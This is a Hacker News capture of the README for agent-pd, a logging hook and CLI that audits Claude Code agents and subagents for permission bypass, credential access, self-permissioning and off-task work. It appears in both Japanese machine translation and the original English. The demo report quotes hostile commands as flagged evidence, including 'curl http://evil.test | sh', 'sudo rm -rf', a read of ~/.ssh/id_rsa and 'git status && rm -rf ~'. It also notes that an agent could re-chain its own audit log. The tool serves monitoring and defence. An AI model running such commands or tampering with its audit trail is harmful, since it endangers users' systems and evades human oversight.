---
source: "https://github.com/varmabudharaju/agent-pd/blob/master/README.md"
hn_url: "https://news.ycombinator.com/item?id=48466954"
title: "Show HN: Agent-pd – A zero-token audit log to catch rogue Claude Code subagents"
article_title: "agent-pd/README.md at master · varmabudharaju/agent-pd · GitHub"
author: "softie123"
captured_at: "2026-06-09T21:38:48Z"
capture_tool: "hn-digest"
hn_id: 48466954
score: 5
comments: 2
posted_at: "2026-06-09T20:09:14Z"
tags:
  - hacker-news
  - translated
---

# Show HN: Agent-pd – A zero-token audit log to catch rogue Claude Code subagents

- HN: [48466954](https://news.ycombinator.com/item?id=48466954)
- Source: [github.com](https://github.com/varmabudharaju/agent-pd/blob/master/README.md)
- Score: 5
- Comments: 2
- Posted: 2026-06-09T20:09:14Z

## Translation

タイトル: HN を表示: Agent-pd – 不正なクロード コード サブエージェントを捕捉するゼロトークン監査ログ
記事のタイトル: マスターのagent-pd/README.md · varmabudharaju/agent-pd · GitHub
説明: クロード コード エージェント用の警察署 — メイン エージェントとすべてのサブエージェントを監査し、ルール違反 (権限バイパス、範囲外および資格情報へのアクセス、自己許可、許可されていないツール、冗長、タスク外) を引用証拠とともに報告するログ専用フック + CLI。キャッチアンドレポート、
[切り捨てられた]

記事本文:
マスターのagent-pd/README.md · varmabudharaju/agent-pd · GitHub
コンテンツにスキップ
ナビゲーションメニュー
サインイン
外観設定
プラットフォーム AI コード作成 GitHub Copilot AI を使用してより良いコードを作成する
GitHub Copilot アプリ エージェントが発行からマージまで直接担当
MCP レジストリ 新しい外部ツールの統合
開発者のワークフロー アクション あらゆるワークフローを自動化します
コードスペース インスタント開発環境
コードレビュー コードの変更を管理する
アプリケーションセキュリティ GitHub Advanced Security 脆弱性を見つけて修正する
コードのセキュリティ 構築時にコードを保護する
機密保護 漏洩が始まる前に阻止
企業規模別のソリューション
タイプごとに詳しく見る お客様の事例
サポートとサービスのドキュメント
オープンソース コミュニティ GitHub スポンサー オープンソース開発者に資金を提供する
エンタープライズ エンタープライズ ソリューション エンタープライズ プラットフォーム AI を活用した開発者プラットフォーム
利用可能なアドオン GitHub Advanced Security エンタープライズ グレードのセキュリティ機能
Copilot for Business エンタープライズ グレードの AI 機能
プレミアム サポート エンタープライズ レベルの 24 時間年中無休のサポート
検索またはジャンプ...
コード、リポジトリ、ユーザー、問題、プル リクエストを検索します...
クリア
検索構文のヒント
フィードバックを提供する
-->
私たちはフィードバックをすべて読み、ご意見を真摯に受け止めます。
保存された検索を使用して結果をより迅速にフィルタリングします
-->
名前
クエリ
利用可能なすべての修飾子を確認するには、ドキュメントを参照してください。
外観設定
フォーカスをリセットする
別のタブまたはウィンドウでサインインしました。リロードしてセッションを更新します。
別のタブまたはウィンドウでサインアウトしました。リロードしてセッションを更新します。
別のタブまたはウィンドウでアカウントを切り替えました。リロードしてセッションを更新します。
アラートを閉じる
{{ メッセージ }}
ヴァルマブダラジュ
/
エージェントPD
公共
通知
通知設定を変更するにはサインインする必要があります
追加のナビゲーション オプション
コード
パスをコピーする 責任を負う さらに多くのファイル アクションを責任を負う

その他のファイルアクション 最新のコミット
履歴 履歴 386 行 (290 loc) · 21 KB マスター ブレッドクラム
トップ ファイルのメタデータとコントロール
raw ファイルのコピー raw ファイルのダウンロード アウトライン編集と raw アクション
🚔 エージェントPD
クロード・コードのエージェントのための警察署
ログ専用フックは、メイン エージェントとそのエージェントからのすべてのツールと権限イベントを記録します。
サブエージェント。 pd CLI は、6 つの検出器を介してログを再生し、ルール違反を報告します。
引用された証拠。キャッチアンドレポート — ブロックすることはありません。
クイックスタート · 仕組み · 検出器 · アーキテクチャ · セキュリティ
ファイアウォールではなく、フライトレコーダー + 警察スキャナー。アクションを停止する必要がある場合は、
クロード コードの許可プロンプトまたは OS サンドボックスのままです。 Agent-pd はエージェントとは何かを示します
忠実に、事後的に、あるいは起こったままに生きる。
🛰️ クロード コードの新しいエージェントによって生成されたものを含む、メイン エージェント + すべてのサブエージェントをカバーします。
動的ワークフロー ツール (記録されたワークフロー サブエージェント フック イベントに対して検証済み)。
🎯 トークンコストゼロの 6 つの決定論的検出器 - 拒否された通話、範囲外、および
認証情報へのアクセス、権限バイパス、自己権限、許可されていないツール、タスク外の作業。
🔒 オプションのオフホスト追加専用シンクを備えた改ざん防止監査ログ (ハッシュチェーン)。
🙂 正直な設計です — それは基準を引き上げます。サンドボックスではありません。 SECURITY.md を参照してください。
Claude Code エージェントは、ファイルを読み取り、シェル コマンドを実行し、サブエージェントを生成できます。そのほとんどは、
それはいいのですが、通常、エージェントが実際に何をしたかを知るには、トランスクリプトをスクロールする必要があります。
そして、拒否された呼び出しはトランスクリプトにまったく到達しません（Claude Code は最初にそれらを強制終了します）。エージェントPD
すべてのイベントをセッションごとの監査ログに記録するフックをインストールし、次のツールを提供します。
質問: エージェントが範囲外になったか、認証情報に触れたか、エスカレーションを試みたか、独自の設定を編集したか、
それがなかったツールを使用する

許可されますか、それとも概要から逸脱しますか？
SETUP CAPTURE (自動、セッションごと) READ (セッションごとまたは --all)
pd install-hook → すべてのツール呼び出しでフックが起動 → pd レポート (フォレンジック)
│ │ pd watch（ライブスキャナー）
settings.json ~/.claude/pd/audit/<session>.jsonl pd ジャッジ (オプトイン LLM パス)
全体像については、システム コンテキスト、コンポーネント、シーケンス、検出器パイプライン、
整合性図 (レンダリングされたイメージ付き) — ARCHITECTURE.md を参照してください。
フックは、クラッシュしても安全なレコーダーです。 ~/.claude/settings.json にグローバルに登録されます
PostToolUse / PermissionDenied / SubagentStart / SubagentStop で。イベントごとに 1 つ追加されます
正規化され、ハッシュチェーンされた行がセッションごとの監査ファイルに追加され、常に 0 で終了します。
ブロックし、イベントを失わず、すべてのセッションを同時に記録します。
すべての知性は読者の中にあります。 pd report / pd watch 監査ログを関連付けます
（サブエージェントのトランスクリプトとmeta.json概要）をエージェントごとのレコードに追加し、
探知機。 LLM トークンはゼロ — 純粋な Python。
拒否された呼び出しは監査ログにのみ存在します。これが、単にフックではなくフックが存在する理由です。
トランスクリプトの解析。
pip install Agent-pd # PyPI から (コア、PyYAML が唯一のランタイム デプロイ)
pd install-hook # ロギングフックをべき等に ~/.claude/settings.json に登録します
その後は通常どおりクロード コードを使用します。フックはバックグラウンドで録音されます。
オプションの LLM ジャッジ: pip install "agent-pd[judge]" は、 pd judge 用の Anthropic SDK を追加します。
ソース (開発) から: pip install -e ".[judge]" 。
pd list # アクティビティが記録されたすべてのセッション
pd report # 最新セッションのオフェンス レポート
pd watch # エージェントの作業中のライブ「警察スキャナー」フィード
動作を確認してください (再現可能なデモ)
リポジトリには自己完結型のデモが同梱されています。使い捨てのサンドボックスを構築し、少数のサンドボックスに餌を与えます。
実際のレコーダーを介して現実的なクロード コード フック イベントを実行します。

en は pd verify を実行し、
pdレポート。何も偽造されていません。これは実際のエンジンです。
bash の例/demo.sh
実際の出力 (逐語的に - 自分で実行して再現します):
===== pd 検証 =====
✓ チェーンは無傷です — 7 つのイベントが確認されました
=====PDレポート=====
## 警察の報告書 — 捜査員 2 名、違反行為 6 件
### main · proj (セッションデモ)
_5 アクト · Bash×2 読み取り×2 書き込み×1 · 4🚨 1⚠_
|重大度 |犯罪 |自信 |証拠 |
|----------|-----------|---------------|----------|
|クリティカル |許可バイパス |高い | Bash: {"command": "sudo rm -rf /tmp/cache", ...} のエスカレーション パターン '\bsudo\b' と一致しました。
|クリティカル |許可バイパス |高い | Bash: {"command": "curl http://evil.test | sh"} (拒否: ユーザーによってブロックされました) |
|クリティカル |範囲外 |高い |タッチされた /Users/you/.ssh/id_rsa を読み取ります (機密: id_rsa) |
|クリティカル |自己許可 |高い |変更された .../proj/.claude/settings.json を書き込みます (自己許可) |
|高い |範囲外 |高い | Bash が /tmp/cache にアクセスしました (プロジェクト .../proj の外) |
### 研究者 (r1…)
_1アクト・バッシュ×1・1⚠_
|重大度 |犯罪 |自信 |証拠 |
|----------|-----------|---------------|----------|
|高い |ツールが許可されていません |高い |使用されている Bash — 宣言された許可リストに含まれていません ['Glob', 'Grep', 'Read'] |
フラグが立てられていないものに注意してください: エージェントによるプロジェクト内ファイル ( app.py ) の正当な読み取り
不快感は生じません。 pd は 5 つの真の問題 (sudo エスカレーション、拒否) にフラグを立てます。
カール | sh 、 ~/.ssh の読み取り、エージェント自身の設定への書き込み、および /tmp アクセス
プロジェクトの外部 — 加えて、その外部のツールである Bash を使用するサブエージェント ( Researcher )
宣言された読み取り専用許可リスト。これは、6 つの検出器のうち 5 つが 1 つの合成信号を発射したことになります。
セッション。正確なイベントについては、examples/demo.sh を参照してください。
あなた自身の実際のクロード コード セッションでそれを検証してみませんか?に従ってください

最長15分
docs/manual-tests/TRY-IT-LIVE.md の実践的なウォークスルー。
pd install-hook # ロギングフックを登録します (1 回限り)
pd list # すべての記録されたセッション
PD レポート # オフェンス レポート、最新のセッション
pd レポート --session < id > --format md # md |ジェソン |両方
pd report --verbose # エージェントごとに完全な証拠 + タッチされたファイル
pd レポート --agent < id | main > # 1 つのエージェントに焦点を当てる: ダイジェストとエージェントが実行したすべてのアクション
pd watch # ライブ フィード、最新のセッション — 新しいアクティビティをストリームします
# これから (tail -f のように);既存のバックログはスキップされます
pd watch --replay # 最初にセッションのバックログ全体を再生し、次に最後を再生します
pd watch --all # すべてのセッションにわたるマージされたフィード (§session タグ)
pd watch --crimes-only # 何か問題がない限り静かに
pd watch --verbose # 完全なコマンド + 理由、切り捨てなし
pd watch --session < id > --no-color --no-emoji # プレーンターミナル / SSH
pd verify # 監査ログのハッシュチェーンを確認します (最新のセッション)
pd verify --all # すべてのセッションを検証します。改ざん/切り捨て時に出口 2
# HMAC キーによる整合性のために PD_AUDIT_KEY を設定します
pd ジャッジ # ドライラン (無料): アイテム / エージェント / ≈トークン推定
pd judge --run --via-claude-code # クロード サブスクリプションの off_task フラグを確認します
pd judge --run --model Sonnet --max 20 # または従量制 Anthropic API 経由
pd コンパクト [--セッション ID] [--DAYS より古いプルーン] [--dry-run]
# 古いログを gzip (<sid>.jsonl -> .jsonl.gz);アクティブをスキップします
# セッション;ロスレス検出。オプションの年齢に応じたプルーン。
pd シンクプッシュ [--セッション ID] [--all] # 未送信の連鎖イベントをオフホストに転送 (追加専用シンク)
pd シンク ステータス [--セッション ID] [--all] # セッションごとに転送/最後。 「リモートアヘッド」フラグ
検出器
6 つの決定論的検出器 (ゼロトークン) と 1 つのオプトイン LLM パス。
5 つの決定論的検出器は信頼でき、無料です。 off_task は意図的にノイズを発生させます

y
そして、明確にラベル付けされた低信頼性 — 裁判官 (下記) は、それを高信頼性の評決に変えます。
スコープ外およびエスカレーションのヒットは、アクションが実行されると、静かな情報重大度にダウングレードされます。
設定したアクセス許可ルールと一致します ( ~/.claude/settings.json の Permissions.allow)
またはプロジェクト .claude/settings.local.json ) — 承認済み → 情報、未承認 → 完全な重大度。
マッチングはクロード コード自体のセマンティクスに忠実です: シェル演算子の分割 (Bash(git:*))
ルールは git status && rm -rf ~ )、コマンド置換 / バックティック抽出をライセンスしません。
ターゲットを別の承認、単語境界プレフィックスとしてリダイレクトします ( npm install:* ≠
npm installmalware )、および gitignore スタイルのグロブ。曖昧さは保守的に解決される → 解決されない
許可されます (フラグが立っていないことは、フラグが立っていないことよりも悪いです)。次の 2 つは決してダウングレードされません。
機密性の高いパス アクセスと、完全に壊滅的なコマンド。拒否された通話は引き続き重要です
それにもかかわらず、拒否は定義上許可されていません。
off_task ジャッジ ( pd ジャッジ ) — オプトイン、コスト上限あり
各エージェントの概要とフラグ付き検索を読み取り、確認または
ノイズの多い off_task フラグを削除します。コストがほとんどかからないように構築されています:
オプトイン — フックまたは pd watch では実行されません。
デフォルトで予行演習 — 推定値を出力します。実際に呼び出すには --run を追加します。
事前フィルタリング + バッチ処理 - すでにフラグが設定されているアイテムのみ、エージェントごとに 1 つの API 呼び出し。
2 つのバックエンド: --via-claude-code シェルアウトでヘッドレス クロード CLI (クロード
サブスクリプション、API キーなし)、または従量制の Anthropic API ( pip install -e ".[judge]" +
ANTHROPIC_API_KEY )。 --model haiku|sonnet|opus (デフォルトの俳句)、 --max N 。
エージェントが何をしているのか、どのルールに違反しているのかをリアルタイムでフィードします。各エージェントが取得するのは、
安定した色と、それに割り当てられた概要を含むバナー。あらゆる行動は

重大度のあるフィードライン
バッジ;ライブラップシートのフッターには、エージェントごとの犯罪が集計されています。
┌ ▸ 探索 · a93c を開始しました
│ 概要: 「authenticate() の呼び出し元をすべて検索する」
━─
12:01:03 Explore·a93c Grep "authenticate\(" ✓
12:01:06 gp·a55d Bash sudo rm -rf /tmp/cache 🚨 クリティカル Permission_bypass
└ コマンド内のエスカレーションパターン「sudo」
ラップシート Explore · a93c: clean · gp · a55d: 1🚨 · 合計 1 犯罪 / 2 行為
追加の依存関係はありません — ANSI のみ。 Ctrl-C を押すと、最終ラップ シートが印刷されます。
監査ログの整合性とオフホスト シンク
すべてのイベントにはシーケンスとチェーンが含まれます = sha256(prev_chain + canonical(event)) (HMAC-SHA256)
PD_AUDIT_KEY が設定されている場合)、セッションごとのファイル ロックの下でフックによって計算されます。
<sid>.head.json アンカー。 pd verify はチェーンを再計算し、 ✓ intact を報告します。
✗ TAMPER DETECTED 、または ✗ TRUNCATED (出口 2) であり、 pd Compact にわたって保持されます。
これは改ざんが明らかですが、改ざん防止ではありません。Bash を使用する同じユーザー エージェントは、
ファイル全体。そのギャップの半分の遡及削除を埋めるために、pd シンクはそれぞれを前進させます。
チェーンされたイベントをオフホスト、追加専用の宛先 (ファイルまたは http バックエンド、環境のみ)
PD_SINK_TOKEN ; https:// リモート トークンに適用されます。リダイレクトは追跡されません）。イベントが完了すると、
オフホストに出荷されると、後でローカルで書き換えてもアクセスできません。 pd シンクステータスフラグ「リモート先行」
ローカルに残るイベントよりも送信されたイベントの方が多い場合 —

[切り捨てられた]

## Original Extract

A police department for your Claude Code agents — a logging-only hook + CLI that audits the main agent and every subagent and reports rule offenses (permission bypass, out-of-scope & credential access, self-permissioning, disallowed tools, redundant, off-task) with quoted evidence. Catch-and-report,
[truncated]

agent-pd/README.md at master · varmabudharaju/agent-pd · GitHub
Skip to content
Navigation Menu
Sign in
Appearance settings
Platform AI CODE CREATION GitHub Copilot Write better code with AI
GitHub Copilot app Direct agents from issue to merge
MCP Registry New Integrate external tools
DEVELOPER WORKFLOWS Actions Automate any workflow
Codespaces Instant dev environments
Code Review Manage code changes
APPLICATION SECURITY GitHub Advanced Security Find and fix vulnerabilities
Code security Secure your code as you build
Secret protection Stop leaks before they start
Solutions BY COMPANY SIZE Enterprises
EXPLORE BY TYPE Customer stories
SUPPORT & SERVICES Documentation
Open Source COMMUNITY GitHub Sponsors Fund open source developers
Enterprise ENTERPRISE SOLUTIONS Enterprise platform AI-powered developer platform
AVAILABLE ADD-ONS GitHub Advanced Security Enterprise-grade security features
Copilot for Business Enterprise-grade AI features
Premium Support Enterprise-grade 24/7 support
Search or jump to...
Search code, repositories, users, issues, pull requests...
Clear
Search syntax tips
Provide feedback
-->
We read every piece of feedback, and take your input very seriously.
Use saved searches to filter your results more quickly
-->
Name
Query
To see all available qualifiers, see our documentation .
Appearance settings
Resetting focus
You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.
Dismiss alert
{{ message }}
varmabudharaju
/
agent-pd
Public
Notifications
You must be signed in to change notification settings
Additional navigation options
Code
Copy path Blame More file actions Blame More file actions Latest commit
History History 386 lines (290 loc) · 21 KB master Breadcrumbs
Top File metadata and controls
Copy raw file Download raw file Outline Edit and raw actions
🚔 agent-pd
A police department for your Claude Code agents
A logging-only hook records every tool & permission event from the main agent and its
subagents; the pd CLI replays that log through six detectors and reports rule offenses with
quoted evidence. Catch-and-report — it never blocks.
Quickstart · How it works · Detectors · Architecture · Security
Flight recorder + police scanner, not a firewall. If you need to stop an action, that
stays with Claude Code's permission prompts or an OS sandbox. agent-pd tells you what an agent
did — faithfully, after the fact or live as it happens.
🛰️ Covers the main agent + every subagent , including those spawned by Claude Code's new
dynamic Workflow tool (verified against recorded workflow-subagent hook events).
🎯 Six deterministic detectors at zero token cost — denied calls, out-of-scope &
credential access, permission bypass, self-permissioning, disallowed tools, off-task work.
🔒 Tamper-evident audit log (hash-chained) with an optional off-host append-only sink .
🙂 Honest by design — it raises the bar; it is not a sandbox. See SECURITY.md .
Claude Code agents can read files, run shell commands, and spawn subagents. Most of that is
fine — but you usually find out what an agent actually did only by scrolling a transcript,
and denied calls never reach the transcript at all (Claude Code kills them first). agent-pd
installs a hook that records every event to a per-session audit log, then gives you tools to
ask: did any agent go out of scope, touch credentials, try to escalate, edit its own config,
use a tool it wasn't allowed, or wander off its brief?
SETUP CAPTURE (automatic, every session) READ (per session or --all)
pd install-hook → hook fires on every tool call → pd report (forensic)
│ │ pd watch (live scanner)
settings.json ~/.claude/pd/audit/<session>.jsonl pd judge (opt-in LLM pass)
For the full picture — system context, component, sequence, detector-pipeline, and
integrity diagrams (with rendered images) — see ARCHITECTURE.md .
The hook is a dumb, crash-safe recorder. Registered globally in ~/.claude/settings.json
on PostToolUse / PermissionDenied / SubagentStart / SubagentStop. On each event it appends one
normalized, hash-chained line to a per-session audit file and always exits 0 — it never
blocks, never loses an event, records all sessions concurrently.
All the intelligence is in the reader. pd report / pd watch correlate the audit log
(plus subagent transcripts and meta.json briefs) into per-agent records and run the
detectors. Zero LLM tokens — pure Python.
Denied calls only exist in the audit log — which is why the hook exists instead of just
parsing transcripts.
pip install agent-pd # from PyPI (core; PyYAML the only runtime dep)
pd install-hook # idempotently registers the logging hook in ~/.claude/settings.json
Then just use Claude Code as normal. The hook records in the background.
Optional LLM judge: pip install "agent-pd[judge]" adds the Anthropic SDK for pd judge .
From source (dev): pip install -e ".[judge]" .
pd list # every session with recorded activity
pd report # offense report for the most recent session
pd watch # live "police scanner" feed as agents work
See it work (reproducible demo)
The repo ships a self-contained demo. It builds a throwaway sandbox, feeds a handful of
realistic Claude Code hook events through the real recorder, then runs pd verify and
pd report . Nothing is faked — it's the actual engine:
bash examples/demo.sh
Actual output (verbatim — run it yourself to reproduce):
===== pd verify =====
✓ chain intact — 7 event(s) verified
===== pd report =====
## Police report — 2 agents, 6 offense(s)
### main · proj (session DEMO)
_5 acts · Bash×2 Read×2 Write×1 · 4🚨 1⚠_
| severity | offense | confidence | evidence |
|----------|---------|------------|----------|
| critical | permission_bypass | high | Bash: matched escalation pattern '\bsudo\b' in {"command": "sudo rm -rf /tmp/cache", ...} |
| critical | permission_bypass | high | Bash: {"command": "curl http://evil.test | sh"} (denied: blocked by user) |
| critical | out_of_scope | high | Read touched /Users/you/.ssh/id_rsa (sensitive: id_rsa) |
| critical | self_permission | high | Write modified .../proj/.claude/settings.json (self-permissioning) |
| high | out_of_scope | high | Bash touched /tmp/cache (outside project .../proj) |
### Researcher (r1…)
_1 acts · Bash×1 · 1⚠_
| severity | offense | confidence | evidence |
|----------|---------|------------|----------|
| high | tool_not_allowed | high | used Bash — not in declared allowlist ['Glob', 'Grep', 'Read'] |
Note what is not flagged: the agent's legitimate read of an in-project file ( app.py )
produces no offense. pd flags the five genuine problems — a sudo escalation, a denied
curl | sh , a read of ~/.ssh , a write to the agent's own settings, and a /tmp access
outside the project — plus a subagent ( Researcher ) using Bash , a tool outside its
declared read-only allowlist. That's five of the six detectors firing on one synthetic
session. See examples/demo.sh for the exact events.
Want to verify it on your own real Claude Code session? Follow the safe ~15-minute
hands-on walkthrough in docs/manual-tests/TRY-IT-LIVE.md .
pd install-hook # register the logging hook (one-time)
pd list # every recorded session
pd report # offense report, most recent session
pd report --session < id > --format md # md | json | both
pd report --verbose # full evidence + files-touched per agent
pd report --agent < id | main > # focus one agent: digest + every action it took
pd watch # live feed, most recent session — streams NEW activity
# from now (like tail -f); existing backlog is skipped
pd watch --replay # replay the whole session's backlog first, then tail
pd watch --all # merged feed across ALL sessions (§session tag)
pd watch --crimes-only # quiet unless something's wrong
pd watch --verbose # full commands + reasons, no truncation
pd watch --session < id > --no-color --no-emoji # plain terminals / SSH
pd verify # check the audit-log hash-chain (most recent session)
pd verify --all # verify every session; exit 2 on tamper/truncation
# set PD_AUDIT_KEY for HMAC-keyed integrity
pd judge # dry run (free): items / agents / ≈token estimate
pd judge --run --via-claude-code # confirm off_task flags on your Claude subscription
pd judge --run --model sonnet --max 20 # or via the metered Anthropic API
pd compact [--session ID] [--prune-older-than DAYS] [--dry-run]
# gzip old logs (<sid>.jsonl -> .jsonl.gz); skips the active
# session; lossless for detection. Optional age-based prune.
pd sink push [--session ID] [--all] # forward un-sent chained events off-host (append-only sink)
pd sink status [--session ID] [--all] # forwarded/last per session; flags "remote ahead"
The detectors
Six deterministic detectors (zero tokens) plus one opt-in LLM pass.
The five deterministic detectors are trustworthy and free. off_task is intentionally noisy
and hard-labeled low-confidence — the judge (below) turns it into high-confidence verdicts.
out_of_scope and escalation hits are downgraded to a quiet info severity when the action
matches a permission allow-rule you configured ( permissions.allow in ~/.claude/settings.json
or project .claude/settings.local.json ) — authorized → info, unauthorized → full severity .
Matching is faithful to Claude Code's own semantics : shell-operator splitting (a Bash(git:*)
rule does not license git status && rm -rf ~ ), command-substitution / backtick extraction,
redirect targets as a separate authorization, word-boundary prefixes ( npm install:* ≠
npm installmalware ), and gitignore-style globs. Ambiguity resolves conservatively → not
permitted (under-flagging is worse than over-flagging). Two things are never downgraded:
sensitive-path access and categorically-catastrophic commands. A denied call stays critical
regardless — a denial is unpermitted by definition.
The off_task judge ( pd judge ) — opt-in, cost-capped
An optional LLM pass that reads each agent's brief and its flagged searches, then confirms or
drops the noisy off_task flags. Built to cost almost nothing:
Opt-in — never runs in the hook or pd watch .
Dry-run by default — prints an estimate; add --run to actually call.
Pre-filtered + batched — only already-flagged items, one API call per agent.
Two backends: --via-claude-code shells out to the headless claude CLI ( your Claude
subscription, no API key ), or the metered Anthropic API ( pip install -e ".[judge]" +
ANTHROPIC_API_KEY ). --model haiku|sonnet|opus (default haiku), --max N .
A real-time feed of what your agents are doing and which rules they're breaking. Each agent gets
a stable color and a banner with its assigned brief; every action is a feed line with a severity
badge; a live rap-sheet footer tallies crimes per agent.
┌ ▸ Explore · a93c started
│ brief: "find all callers of authenticate()"
└─
12:01:03 Explore·a93c Grep "authenticate\(" ✓
12:01:06 gp·a55d Bash sudo rm -rf /tmp/cache 🚨 CRITICAL permission_bypass
└ escalation pattern 'sudo ' in command
RAP SHEET Explore·a93c: clean · gp·a55d: 1🚨 · total 1 crimes / 2 acts
Zero extra dependencies — ANSI only. Ctrl-C prints a final rap sheet.
Audit-log integrity & off-host sink
Every event carries a seq and a chain = sha256(prev_chain + canonical(event)) (HMAC-SHA256
if PD_AUDIT_KEY is set), computed by the hook under a per-session file lock with a
<sid>.head.json anchor. pd verify recomputes the chain and reports ✓ intact ,
✗ TAMPER DETECTED , or ✗ TRUNCATED (exit 2), and holds across pd compact .
This is tamper- evident , not tamper- proof : a same-user agent with Bash can re-chain the
whole file. To close the retroactive-deletion half of that gap, pd sink push forwards each
chained event to an off-host, append-only destination (file or http backend; env-only
PD_SINK_TOKEN ; https:// enforced for remote tokens; redirects not followed). Once an event has
shipped off-host, a later local rewrite can't reach it. pd sink status flags "remote ahead"
when more events shipped than remain locally —

[truncated]
